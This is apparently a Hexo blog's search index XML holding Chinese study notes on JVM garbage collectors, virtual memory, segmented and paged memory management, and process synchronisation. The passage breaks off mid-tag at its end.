<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>jvm垃圾回收算法</title>
      <link href="/jvm%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95/"/>
      <url>/jvm%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="垃圾回收"><a href="#垃圾回收" class="headerlink" title="垃圾回收"></a>垃圾回收</h1><p>Java堆内存分为新生代和老年代:新生代主要存储短生命周期的对象,适合使用复制算法进行垃圾回收;老年代主要存储长生命周期的对象,适合使用标记整理算法进行垃圾回收因此,JVM针对新生代和老年代分别提供了多种不同的垃圾收集器,针对新生代提供的垃圾收集器有串行ParNew并行清除,针对老年代提供的垃圾收集器有串行老并行老CMS,还有针对不同区域的G1分区收集算法,如图。</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/image-20201008143352344.png" alt="image-20201008143352344"></p><h2 id="Serial-垃圾收集器-单线程-复制算法"><a href="#Serial-垃圾收集器-单线程-复制算法" class="headerlink" title="Serial 垃圾收集器:单线程,复制算法"></a>Serial 垃圾收集器:单线程,复制算法</h2><p>Serial 垃圾收集器基于复制算法实现,它是一个单线程收集器,在它正在进行垃圾收集时,必须暂停其他所有工作线程,直到垃圾收集结束 Serial 垃圾收集器采用了复制算法,简单 高效,对于单 CPU 运行环境来说,没有线程交互开销,可以获得最高的单线程垃圾收集效率,因此 Serial 垃圾收集器是 Java 虚拟机运行在 Client 模式下的新生代的默认垃圾收集器。</p><h2 id="ParNew-垃圾收集器-多线程-复制算法"><a href="#ParNew-垃圾收集器-多线程-复制算法" class="headerlink" title="ParNew 垃圾收集器:多线程,复制算法"></a>ParNew 垃圾收集器:多线程,复制算法</h2><p>ParNew 垃圾收集器是 Serial 垃圾收集器的多线程实现,同样采用了复制算法,它采用多线程模式工作,除此之外和 Serial 收集器几乎一样 ParNew 垃圾收集器在垃圾收集过程中会暂停所有其他工作线程,是 Java 虚拟机运行在 Server 模式下的新生代的默认垃圾收集器 。</p><p>ParNew 垃圾收集器默认开启与 CPU 同等数量的线程进行垃圾回收,在 Java 应用启动时可通过-XX:ParallelGCThreads 参数调节 ParNew 垃圾收集器的工作线程数。</p><h2 id="Parallel-Scavenge-垃圾收集器-多线程-复制算法"><a href="#Parallel-Scavenge-垃圾收集器-多线程-复制算法" class="headerlink" title="Parallel Scavenge 垃圾收集器:多线程,复制算法"></a>Parallel Scavenge 垃圾收集器:多线程,复制算法</h2><p>Parallel Scavenge 收集器是为提高新生代垃圾收集效率而设计的垃圾收集器,基于多线程复制算法实现,在系统吞吐量上有很大的优化,可以更高效地利用 CPU 尽快完成垃圾回收任务。</p><p> Parallel Scavenge 通过自适应调节策略提高系统吞吐量,提供了三个参数用于调节 控制垃圾回收的停顿时间及吞吐量,分别是控制最大垃圾收集停顿时间的-XX:MaxGCPauseMillis 参数,控制吞吐量大小的-XX:GCTimeRatio 参数和控制自适应调节策略开启与否的 UseAdaptiveSizePolicy 参数。</p><h2 id="Serial-Old-垃圾收集器-单线程-标记整理算法"><a href="#Serial-Old-垃圾收集器-单线程-标记整理算法" class="headerlink" title="Serial Old 垃圾收集器:单线程,标记整理算法"></a>Serial Old 垃圾收集器:单线程,标记整理算法</h2><p> Serial Old 垃圾收集器是 Serial 垃圾收集器的老年代实现,同 Serial 一样采用单线程执行,不同的是,Serial Old 针对老年代长生命周期的特点基于标记整理算法实现 Serial Old 垃圾收集器是 JVM 运行在 Client 模式下的老年代的默认垃圾收集器。</p><p> 新生代的 Serial 垃圾收集器和老年代的 Serial Old 垃圾收集器可搭配使用,分别针对 JVM 的新生代和老年代进行垃圾回收,其垃圾收集过程如图所示 在新生代采用 Serial 垃圾收集器基于复制算法进行垃圾回收,未被其回收的对象在老年代被 Serial Old 垃圾收集器基于标记整理算法进行垃圾回收。</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/image-20201008144232536.png" alt="image-20201008144232536"></p><h2 id="Parallel-Old-垃圾收集器-多线程-标记整理算法"><a href="#Parallel-Old-垃圾收集器-多线程-标记整理算法" class="headerlink" title="Parallel Old 垃圾收集器:多线程,标记整理算法"></a>Parallel Old 垃圾收集器:多线程,标记整理算法</h2><p> Parallel Old 垃圾收集器采用多线程并发进行垃圾回收,它根据老年代长生命周期的特点,基于多线程的标记整理算法实现 Parallel Old 垃圾收集器在设计上优先考虑系统吞吐量,其次考虑停顿时间等因素,如果系统对吞吐量的要求较高,则可以优先考虑新生代的 Parallel Scavenge 垃圾收集器和老年代的 Parallel Old 垃圾收集器的配合使用。</p><p> 新生代的 Parallel Scavenge 垃圾收集器和老年代的 Parallel Old 垃圾收集器的搭配运行过程如图所示 新生代基于 Parallel Scavenge 垃圾收集器的复制算法进行垃圾回收,老年代基于 Parallel Old 垃圾收集器的标记整理算法进行垃圾回收。</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/image-20201008144420468.png" alt="image-20201008144420468"></p><h2 id="CMS垃圾回收器"><a href="#CMS垃圾回收器" class="headerlink" title="CMS垃圾回收器"></a>CMS垃圾回收器</h2><p>CMS(Concurrent Mark Sweep)垃圾收集器是为老年代设计的垃圾收集器,其主要目的是达到最短的垃圾回收停顿时间,基于线程的标记清除算法实现,以便在多线程并发环境下以最短的垃圾收集停顿时间提高系统的稳定性。</p><p>CMS 的工作机制相对复杂,垃圾回收过程包含如下 4 个步骤</p><p>(1)初始标记:只标记和 GC Roots 直接关联的对象,速度很快,需要暂停所有工作线程 。</p><p>(2)并发标记:和用户线程一起工作,执行 GC Roots 跟踪标记过程,不需要暂停工作线程 。</p><p>(3)重新标记:在并发标记过程中用户线程继续运行,导致在垃圾回收过程中部分对象的状态发生变化,为了确保这部分对象的状态正确性,需要对其重新标记并暂停工作线程 。</p><p>(4)并发清除:和用户线程一起工作,执行清除 GC Roots 不可达对象的任务,不需要暂停工作线程。</p><p>CMS 垃圾收集器在和用户线程一起工作时(并发标记和并发清除)不需要暂停用户线程,有效缩短了垃圾回收时系统的停顿时间,同时由于 CMS 垃圾收集器和用户线程一起工作,因此其并行度和效率也有很大提升 CMS 收集器的工作流程如图。</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/image-20201008144542197.png" alt="image-20201008144542197"></p><p>G1 垃圾收集器 G1(Garbage First)垃圾收集器为了避免全区域垃圾收集引起的系统停顿,将堆内存划分为大小固定的几个独立区域,独立使用这些区域的内存资源并且跟踪这些区域的垃圾收集进度,同时在后台维护一个优先级列表,在垃圾回收过程中根据系统允许的最长垃圾收集时间,优先回收垃圾最多的区域 G1 垃圾收集器通过内存区域独立划分使用和根据不同优先级回收各区域垃圾的机制,确保了 G1 垃圾收集器在有限时间内获得最高的垃圾收集效率 相对于 CMS 收集器,G1 垃圾收集器两个突出的改进 </p><ul><li>基于标记整理算法,不产生内存碎片 。</li><li>可以精确地控制停顿时间,在不牺牲吞吐量的前提下实现短停顿垃圾回收。</li></ul>]]></content>
      
      
      <categories>
          
          <category> jvm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> jvm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统-虚拟存储管理</title>
      <link href="/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E8%99%9A%E6%8B%9F%E5%AD%98%E5%82%A8%E7%AE%A1%E7%90%86/"/>
      <url>/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E8%99%9A%E6%8B%9F%E5%AD%98%E5%82%A8%E7%AE%A1%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h2 id="交换技术"><a href="#交换技术" class="headerlink" title="交换技术"></a>交换技术</h2><p>交换（Swapping）技术它的主要特点是：打破了一个程序一旦进入内存，就一直驻留在内存直到运行结束的限制。</p><p>在多道程序环境下，内存中可以同时存在多个进程（程序），其中的一部分进程由于等待某些事件而处于阻塞状态，但这些处于阻塞状态的进程仍然驻留内存，并占据着内存空间；另一方面，外存上可能有许多等待装入内存运行的程序，却因内存不足而未能装入。显然，这是一种严重的系统资源浪费，它会使系统的吞吐量下降。为了解决这个问题，可以在操作系统中增加交换（对换）功能，即由操作系统根据需要，将内存中暂时不具备运行条件的部分程序或数据移到外存（换出），以便腾出足够的内存空间，将外存中需要运行的程序或数据调入内存（换入）投入运行。在操作系统中引入交换（对换）技术，可以显著提高内存资源的利用率并改善系统的性能。</p><p>以交换的单位不同来划分，则有以下两种交换方式。</p><ul><li>以进程为单位的交换。每次换入/换出的是整个进程，我们称这种交换为进程交换（进程对换）或整体交换（整体对换）。进程交换广泛应用于分时系统，主要解决内存紧张问题。</li><li>以页（此处不多做介绍）或段（此处不多做介绍）为单位的交换。这种交换分别称为页置换（页交换或页对换）或段置换（段交换或段对换），页置换和段置换是以进程中的某一部分为交换单位，因此又称为部分交换（部分对换）。部分交换广泛应用于现代操作系统中，是实现虚拟存储器的基础。</li></ul><p>我们这里所说的交换是指进程交换，为了实现进程交换，操作系统需要解决以下两个问题。</p><ul><li>对换空间的管理。在具有交换功能的操作系统中，一般将外存空间分为文件区和交换区（对换区）。文件区用来存放文件，而交换区则用来存放从内存中换出的进程，或等待换入内存的进程。尽管文件区一般采用离散分配方式来分配外存存储空间，但交换区的存储空间分配则宜采用连续分配方式，这是因为交换区中存放的是换入/换出的进程，为了提高交换速度，有必要采用连续分配方式，并且交换区可以采用与可变分区存储管理类似的方法进行管理。例如，使用空闲分区表或空闲分区链来记录外存交换区的使用情况，利用首次适应算法、最佳适应算法或最差适应算法来进行外存交换区的分配。</li><li>交换的时机以及选择哪些进程交换。交换时机一般选择在进程的时间片用完，以及进程等待输入/输出时，或者在进程要求扩充其内存空间而得不到满足时。换出到外存的进程一般选择处于阻塞状态，或优先级低且短时间内不会再次投入运行的进程；换入到内存的进程则应选择换出时间最久且已处于就绪状态的进程。</li></ul><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>​    根据程序的局部性原理，一个进程在运行的某个时间段内只访问其程序的一部分指令或数据，所以就没必要在进程运行之前将其所属的全部程序和数据都装入内存，即只装入进程当前运行所需要的部分程序和部分数据就可启动运行，以后再根据需要逐次装入剩余的部分程序和数据。并且，内存中暂不执行的部分程序和暂不使用部分数据也不必放在内存，可以将其由内存调至外存，释放它们所占用的内存空间。对内存中的各进程也是如此，内存中暂时没有执行的进程也可以将其由内存调至外存，释放它所占用的内存空间，并用来装入外存上需要投入运行的进程，被调出到外存的进程在以后需要运行时，再重新调入内存。这样一来，在内存容量不变的情况下，就可以使一个大程序在较小的内存空间中运行，也可以装入更多的进程（程序）并发执行。</p><p>由于一次性和驻留性在进程运行时不是必需的，因此可以按照以下方式来运行进程，即一个进程只装入其部分程序和数据便投入运行。在进程运行过程中，若需要访问的指令和数据在内存中，则继续执行；若不在内存中，则系统通过调入功能，把进程需要执行或访问的这部分程序和数据由外存自动装入内存（称为部分装入）；若内存已无足够的空闲区装入这部分信息，则系统把该进程在内存中暂时不用的部分程序和数据从内存中调出到外存（称为部分对换），以便腾出内存空间装入该进程需要调入内存的这部分信息。进程按照这种方式运行，会明显提高内存空间利用率和系统吞吐量。对用户而言，所感觉到的是一个容量更大的内存，通常把它称为虚拟存储器，简称虚存。</p><p>实现虚拟内存的必要条件：</p><p>（1）能够完成虚拟地址到物理地址的转换。程序中使用的是虚拟地址（即逻辑地址），为了实现虚拟存储器，就必须完成虚拟地址到内存物理地址的重定位。虚拟地址的大小可以远远超过实际内存容量的大小，它只受地址寄存器的位数限制，如一个 32 位的地址寄存器，其支持的虚拟地址最大可达 4GB。</p><p>（2）实际内存空间。程序装入内存后才能运行，所以内存空间是构成虚拟存储空间的基础。因为虚拟存储器的运行速度接近于内存速度，所以内存空间越大所构成的虚拟存储器的运行速度也就越快。</p><p>（3）外存交换区。为了从逻辑上扩大内存空间，一般将外存空间分为文件区和交换区。交换区中存放的是在内、外存之间交换的程序和数据，交换区可大可小。</p><p>（4）换入、换出机制。它表现为中断请求机构、淘汰算法及换入、换出软件。</p><p>现代操作系统一般都支持虚拟存储器，但不同系统实现虚拟存储器的具体方式存在差异。程序装入内存时，如果以页或段为单位装入，则分别形成请求分页存储管理方式和请求分段存储管理方式；若将分段和分页结合起来，则又可以形成请求段页式存储管理方式。</p><h2 id="请求段页式存储管理"><a href="#请求段页式存储管理" class="headerlink" title="请求段页式存储管理"></a>请求段页式存储管理</h2><p>​    请求段页式存储管理是建立在段页式存储管理基础上的一种段页式虚拟存储管理。根据段页式存储管理的思想，请求段页式存储管理首先按照程序自身的逻辑结构，将其划分为若干个不同的分段，在每个段内则按页的大小划分为不同的页，内存空间则按照页的大小划分为若干个物理块。内存以物理块为单位进行离散分配，不必将进程所有的页装入内存就可启动运行。当进程运行过程中，访问到不在内存的页时，若该页所在的段在内存，则只产生缺页中断，将所缺的页调入内存；若该页所在的段不在内存，则先产生缺段中断再产生缺页中断，将所缺的页调入内存。若进程需要访问的页已在内存，则对页的管理与段页式存储管理相同。</p><p>1．段表及页表机制</p><p>请求段页式存储管理中的页表和段表是两个重要的数据结构。页表的结构与请求分页存储管理中的页表相似，段表则在段页式存储管理中的段表基础上增加了一些新的字段，这些新增的字段包括中断位（状态位）、修改位和外存始址等，用来支持实现虚拟存储器。</p><p>2．中断处理机制</p><p>由于在请求段页式存储管理中内存空间的分配是以页为单位，因此当某个进程在运行过程中发现所要访问的页不在内存时，就要先判断该页所在段的页表是否在内存，若页表已在内存，则只产生缺页中断，由缺页中断处理程序将所缺的页由外存调入内存；若缺页所在段的页表不在内存则表明该段不在内存，这时先产生缺段中断且由缺段中断处理程序为该段在内存中建立一张页表，并将该页表的内存始址存入段表相应的段表项中，然后再产生缺页中断，由缺页中断处理程序将所缺的页由外存调入内存。</p><p>3．地址转换</p><p>请求段页式存储管理与段页式存储管理的地址转换机制类似，但由于请求段页式存储管理支持虚拟存储器，因此在它的地址转换机制中增加了用于实现虚拟存储器的中断功能和置换功能。请求段页式存储管理中的逻辑地址到内存物理地址转换过程如下。</p><p>（1）若系统中设置了快表，则首先在快表中查找该页对应的页表项，若在快表中找到这个页表项，就将该页表项中的物理块号和逻辑地址中的页内地址进行拼接，得到要访问的内存物理地址。</p><p>（2）如果快表中没有所需要的页表项，则在内存中查找页表（实际上是同时查找），从该页对应页表项中的中断位来判断该页是否在内存。若在内存，则将该页表项中的物理块号与逻辑地址中的页内地址拼接为内存物理地址，同时将该页表项放入快表。</p><p>（3）如果要访问的页还没有调入内存，并且包含该页的段所对应的页表也不在内存（意味着该段不在内存），于是就产生缺段中断将该段的页表调入内存，缺段处理完成后再产生缺页中断；若包含该页的段所对应的页表已在内存，则只产生缺页中断。缺页中断则将该页由外存调入内存，然后通过页表查找得到该页对应的物理块号，并将该物理块与逻辑地址中的页内地址拼接形成要访问的内存物理地址，同时将该页表项放入快表。如图</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/image-20200928084933567.png" alt="image-20200928084933567"></p><p>关联文章：<a href="https://www.gschaos.club/Linux%E8%AE%BE%E7%BD%AE%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/">Linux设置虚拟内存</a></p>]]></content>
      
      
      <categories>
          
          <category> 操作系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统-分段存储和段页存储管理</title>
      <link href="/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E5%88%86%E6%AE%B5%E5%AD%98%E5%82%A8%E5%92%8C%E6%AE%B5%E9%A1%B5%E5%AD%98%E5%82%A8%E7%AE%A1%E7%90%86/"/>
      <url>/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E5%88%86%E6%AE%B5%E5%AD%98%E5%82%A8%E5%92%8C%E6%AE%B5%E9%A1%B5%E5%AD%98%E5%82%A8%E7%AE%A1%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h1 id="分段存储管理的基本原理"><a href="#分段存储管理的基本原理" class="headerlink" title="分段存储管理的基本原理"></a>分段存储管理的基本原理</h1><p>为了提供内存空间利用率，存储管理从固定分区分配发展到可变分区分配，再发展到分页存储管理。但从用户角度看，以上几种管理方式都存在着自身局限性，难以满足用户在编程和使用上的多方面需求。事实上，程序大多采用分段结构，一个程序可以由主程序段、子程序段和数据段等组成，每个段都从逻辑地址 0 开始编制，有各自的名字和长度，并实现不同的功能。</p><h2 id="分段存储："><a href="#分段存储：" class="headerlink" title="分段存储："></a>分段存储：</h2><p> 1．实现原理</p><p>在分段存储管理中，系统将程序的逻辑地址空间分成若干个逻辑分段，如主程序段、子程序段、数据段和工作区段等，每个分段都是一组逻辑意义完整的信息集合，且有各自的段名或段号，即在逻辑上是各自独立的。每个段都是从 0 开始编址的一维连续地址空间，其长度由段自身包含的逻辑信息长度决定，所以各段的长度可以不同，整个程序的所有段则构成了二维地址空间。在为程序分配内存时，允许以段为单位将程序离散地装入相邻或不相邻的内存空间中，而每个段则占用一段连续的内存区域，系统通过地址转换机构，将段的逻辑地址转换为实际的内存物理地址，从而使程序能够正确执行。</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/image-20200927081138694.png" alt="image-20200927081138694"></p><p> 2．逻辑地址结构</p><p>在分段存储管理中，由于程序的地址空间被分成若干个段，因此程序的逻辑地址是二维的，即程序的逻辑地址由段号（段名）和段内地址两部分组成）。段号和段内地址都是从 0 开始编址，段号范围决定了程序中最多允许有多少个段，段内地址的范围则决定了每个段的最大长度。在图示的地址结构中，一个程序最多允许 256（28）个段，每个段的最大长度为 16MB（224）。</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/image-20200927081357129.png" alt="image-20200927081357129"></p><p>在现代操作系统中，绝大多数编译程序都支持分段方式，因此用户程序如何分段这个问题对用户来说是透明的，即可以由编译程序根据源程序的情况自动产生若干个段。</p><p> 3．段表</p><p>在分段存储管理中，程序的各段以离散分配方式装入到内存中相邻或不相邻的空闲分区，即内存中各段之间可以不连续，但每个段在所装入的分区中是连续的。为了使程序正常运行，必须要找到每个逻辑段在内存中具体的物理存储位置，即实现将二维逻辑地址转换为一维物理地址，这项工作通过段映射表（简称段表）来完成。系统为每个程序建立了一个段表，程序的每个段在段表中有一个段表项，这个段表项记录了该段的段名（段号），该段在内存中的起始地址（内存始址）以及该段的长度（段长）等信息。</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/image-20200927081428490.png" alt="image-20200927081428490"></p><h2 id="地址转换与存储保护"><a href="#地址转换与存储保护" class="headerlink" title="地址转换与存储保护"></a>地址转换与存储保护</h2><p>1．地址转换</p><p>分段存储管理也涉及地址转换问题，为了实现段的逻辑地址到内存物理地址的转换，系统为每个程序设置了一个段表，地址转换机构则通过段表来完成逻辑段到内存物理分区的映射。由于段表一般存放在内存中，因此系统使用了段表控制寄存器来存放运行程序（进程）的段表始址（段表在内存中的起始地址）和段表长度（程序的逻辑地址空间中从段号 0 开始划分出的最大段号）。进行地址转换时，先通过段表控制寄存器中存放的段表始址找到段表，然后再从段表中找到对应的段表项来完成逻辑段到内存物理分区的映射。</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/image-20200927081520616.png" alt="image-20200927081520616"></p><p>在地址转换过程中，系统首先将逻辑地址中的段号与段表控制寄存器中的段表长度（程序中允许的最大段号）进行比较，若超过了段表长度，则产生一个段越界中断信号；否则，将段表控制寄存器中的段表始址和逻辑地址中的段号（在段表中又表示段表项的相对位移）相加，找到该段在段表中对应的段表项，并从此段表项中获得该段映射到内存中的起始地址（内存始址）。然后再根据逻辑地址中的段内地址，是否大于段表项中的段长，来判断是否产生段内地址越界，若大于，则产生地址越界中断信号；若不大于（段内地址未越界），则将已获得的该段在内存中的起始地址（内存始址）与逻辑地址中的段内地址相加，得到要访问的内存物理地址。</p><p>上过地址转换过程和分页存储相似，一次转换最少需要访问内存两次，所有分段解决的方法与分页存储管理类似,也是设置联想存储器(快表),过程详见：</p><p><a href="https://www.gschaos.club/%E6%93%8D%E5%81%9A%E7%B3%BB%E7%BB%9F-%E5%90%8C%E6%AD%A5%E5%92%8C%E9%80%9A%E4%BF%A1/">分页存储管理</a> 后半部分。</p><h2 id="段页式存储管理的基本原理"><a href="#段页式存储管理的基本原理" class="headerlink" title="段页式存储管理的基本原理"></a>段页式存储管理的基本原理</h2><p>段页式存储管理结合了分段存储管理和分页存储管理的优点，在为程序分配内存空间时，采用的是「各段之间按分段存储管理进行分配，每个段内部则按分页存储管理进行分配」的原则。内存空间的管理则只按页的大小划分为若干个的物理块，并且内存中所有物理块从 0 开始顺序编号。在为程序分配内存空间时，允许以页为单位，一次性将一个程序中每个段的所有页装入内存若干相邻或不相邻的物理块中。在段页式存储管理中，由于对段又进行了分页，即逻辑地址空间中的最小单位是页，内存空间也被划分为与页大小相等的若干物理块。分配以页为单位进行，因此每个段包含的所有页在内存中也实现了离散存储。</p><p>1．逻辑地址结构</p><p>在段页式存储管理中，一个程序的逻辑地址结构由段号、段内页号和页内地址这三部分组成，如图 。</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/image-20200927083658716.png" alt="image-20200927083658716"></p><p>程序的逻辑地址仍然是一个二维地址空间，用户可见的仍然是段号和段内地址，而地址转换机构，则根据系统要求自动把段内地址分为两部分，高位部分为页号（段内页号），低位部分为页内地址。假定逻辑地址长度为 32 位，若段号占 8 位，段内页号占 12 位，页内地址占 12 位，则一个程序最多允许有 256（28）个段，每段最多允许 4096（212）个页，每页的大小为 4KB（212）。</p><p>2．数据结构</p><p>为了实现段页式存储管理，系统必须设置以下两种数据结构。</p><p>（1）段表。系统为每个程序建立一张段表，程序的每个段在段表中有一个段表项，此段表项记录了该段的页表长度和页表始址（页表在内存中存放的起始地址）。</p><p>（2）页表。系统为程序中的每个段都建立一张页表，一个段中的每个页在该段的页表中都有一个页表项，每个页表项记录了一个页的页号及其映射的内存物理块号。</p><h3 id="地址转换"><a href="#地址转换" class="headerlink" title="地址转换"></a>地址转换</h3><p>在段页式存储管理中，指令中的逻辑地址到内存物理地址的转换也是由地址转换机构完成的。在地址转换过程中需要使用段表和页表，而程序的段表和页表通常都存放在内存中。因此地址转换机构配置了一个段表控制寄存器，用来记录运行程序的段表长度和段表始址（段表存放在内存的起始地址）。段页式存储管理方式的地址转换过程如图 所示。地址转换时，地址转换机构首先将逻辑地址中的段号与段表控制寄存器中的段表长度（程序中允许的最大段号）比较，若段号大于段表长度，则产生段越界中断；否则未越界，这时利用段表控制寄存器中的段表始址和逻辑地址中的段号（表示段表项的相对位移）相加，获得该段号所对应的段表项在段表中的位置，找到该段表项后，从中获得该段的页表在内存中存放的起始地址（页表始址）和页表长度。若逻辑地址中的段内页号（页号）大于该段表项中的页表长度（该段所允许的最大页号），则产生页越界中断；否则，在该段表项中取出页表始址和逻辑地址中的段内页号（页表项的相对位移）相加，获得该段的页表中该页号（段内页号）对应的页表项位置，并从此页表项中获得该页号所映射的内存物理块号，最后将此物理块号和逻辑地址中的页内地址拼接（由物理块号替换逻辑地址中的段内页号而页内地址不变），形成要访问的内存物理地址。</p><p>对段页式存储管理而言，要完成对内存中某个数据的访问，至少要三次访问内存：第一次访问内存是根据段表控制寄存器中的段表始址加上逻辑地址中的段号（段表项的相对位移）在内存中查找程序的段表找到该段号对应的段表项，并在此段表项中找到该段号所对应的页表在内存中的起始地址（页表始址）；第二次访问内存是根据页表始址加上逻辑地址中的段内页号到内存中访问页表找到对应的页表项，并从此页表项中找到该页号（段内页号）映射的物理块号，并将该物理块号与逻辑地址中的页内地址拼接，形成要访问的内存物理地址；第三次才是根据这个内存物理地址去访问该地址中存放的数据。显然，内存访问次数的增加会使计算机的运行速度受到很大的影响。</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/image-20200927083817463.png" alt="image-20200927083817463"></p><p>为了提高地址转换的速度，在段页式存储管理系统中，设置联想存储器（快表）显得尤为重要。快表中存放了当前执行程序最常用的段号、页号（段内页号）和映射的内存物理块号。当要访问内存中某个数据时，可以先根据段号、页号在快表中查找是否有与之对应的表项，若找到，则不必再到内存中去访问段表和页表，直接将快表中找到的表项中所映射的物理块号，与逻辑地址中的页内地址拼接成要访问的内存物理地址；若快表中未找到相应的表项，则仍需两次访问内存（一次访问段表，一次访问页表）来获得内存物理地址，并同时将此次访问的段号、页号与所映射的物理块号填入到快表中；若快表已满，则还需在填入前根据某种算法淘汰快表中的某个表项。</p>]]></content>
      
      
      <categories>
          
          <category> 操作系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统-进程同步与存储管理</title>
      <link href="/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E5%90%8C%E6%AD%A5%E5%92%8C%E9%80%9A%E4%BF%A1/"/>
      <url>/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E5%90%8C%E6%AD%A5%E5%92%8C%E9%80%9A%E4%BF%A1/</url>
      
        <content type="html"><![CDATA[<p>操作系统原理笔记–&gt;同步和通信</p><p>并发执行的程序在运行的时候共享系统的资源，一个进程会受到其他进行的制约，为了协调，达到资源共享，就需要实现进程的互斥和同步。</p><h1 id="进程同步"><a href="#进程同步" class="headerlink" title="进程同步"></a>进程同步</h1><h2 id="同步互斥的几个概念"><a href="#同步互斥的几个概念" class="headerlink" title="同步互斥的几个概念"></a>同步互斥的几个概念</h2><p>（1）进程同步。进程间的同步是指某些进程之间在逻辑上的相互制约关系。</p><p>（2）进程互斥。进程互斥是指某一资源同一时间只允许一个进程对其进行访问，这种访问具有唯一性和排他性。进程互斥通常是进程之间争夺互斥资源而引起的，在这种情况下，任何时刻都不允许两个及两个以上的并发进程同时执行那段访问该互斥资源的程序代码。</p><p>互斥的实现还会产生两个额外的控制问题：饥饿（Starvation）和死锁（Deadlock）。</p><p>（1）饥饿。一个进程所申请的资源总是被优先于自己的其他进程所占有，而长时间处于不能被调度执行的状态（长时间处于就绪或阻塞状态），将这种现象称为「饥饿」。</p><p>（2）死锁。一个进程集合中已经占有部分资源的两个或两个以上进程，还需要获得已被其他进程占有的资源才能够继续执行，有可能出现某些进程相互之间都在等待对方占有的资源而无法运行的局面，即在进程集合中的这些进程处于永远的阻塞状态，这就是「死锁」。</p><p>进程同步与进程互斥的相似之处是进程互斥实际上是进程同步的一种特殊情况，即逐次使用互斥资源，这也是对进程使用资源次序的一种协调（同步）。因此可以将进程互斥和进程同步统称为<font color=blue>进程同步</font>。</p><p>进程同步与进程互斥的区别是进程互斥是由互斥资源引起的，这种互斥无法限制进程对资源的访问顺序，即访问是无序的。进程同步则是指相互协作的并发进程之间存在着必然的联系，若当前运行进程执行过程中需要进行同步时，在没有得到协同工作的其他合作进程发来的同步消息之前，当前运行进程则不能继续向前推进（运行）。在进程同步中，虽然互斥资源仍然制约着进程的执行，但协调各进程向前推进的只能是进程同步，即通过进程同步来协调和制约各合作进程的执行，去完成一个共同的任务，即进程同步是在互斥的基础上（大多数情况），通过其他机制实现进程对资源的有序访问。</p><h2 id="临界"><a href="#临界" class="headerlink" title="临界"></a>临界</h2><p>一定时间内只允许一个进程访问的资源成为临界资源。</p><h2 id="硬件互斥"><a href="#硬件互斥" class="headerlink" title="硬件互斥"></a>硬件互斥</h2><p>采用硬件方法实现进程互斥就是通过计算机提供的一些机器指令来实现进程的互斥 实现进程互斥本质上是实现临界区互斥,而实现临界区互斥的关键又是正确的设置进入区和退出区 机器指令是指在一个指令周期内执行完成的指令,而专用机器指令的执行则不会被中断 使用专用机器指令可以在没有其他指令干扰的情况下,获得临界区是否使用的状态信息 专用机器指令通过设置控制临界区访问的布尔型变量,来控制多个进程对临界区的互斥访问 常用的专用机器指令有 3 个:开关中断指令 测试与设置指令以及交换指令。</p><ol><li><p>开关中断指令</p><p>最简单粗暴的方法，具体方法是进程在进入临界区之前,先执行 关中断 指令来屏蔽掉所有中断,进程完成临界区的任务后,再执行 开中断 指令将中断打开。</p></li><li><p>测试与设置指令 TS</p><p>采用 TS 方法则要为每个临界资源设置一个整型变量 s,可以将它看成一把锁 若 s 的值为 0(开锁状态),则表示没有进程访问该锁对应的临界资源;若 s 的值为 1(关锁状态),则表示该锁对应的临界资源已被某个进程占用。</p></li><li><p>交换指令（Swap）</p><p>交换指令(Swap)的功能是交换两个字的内容,可以用以下函数描述 。</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/image-20200925083327734.png" alt="image-20200925083327734"></p></li></ol><p>   若要使用交换指令来实现进程互斥,则需要为每个临界资源设置一个整型的全局变量 s 若 s 的值为 0 则表示没有进程在临界区;若 s 的值为 1 则表示有进程在临界区(即正在访问临界资源) 此外,还要为每个进程设置一个整型局部变量 key,只有当 s 的值为 0 并且 key 的值为 1 时,本进程才能进入临界区 进入临界区后,s 的值为 1 且 key 的值为 0,退出临界区时,应将 s 的值置为 0。</p><p><strong>虽然使用 TS 和 Swap 指令可以方便地实现进程互斥,但它们都存在以下缺点:当一个进程还在访问临界区时,其他欲进入临界区的进程,只能不断地循环测试 s 的值,显然,不断循环测试 s 造成了 CPU 浪费,这就是 忙等 也就是说,上述两种方法都没有遵循 让权等待 的原则。</strong></p><h1 id="存储管理"><a href="#存储管理" class="headerlink" title="存储管理"></a>存储管理</h1><h2 id="逻辑地址和物理地址"><a href="#逻辑地址和物理地址" class="headerlink" 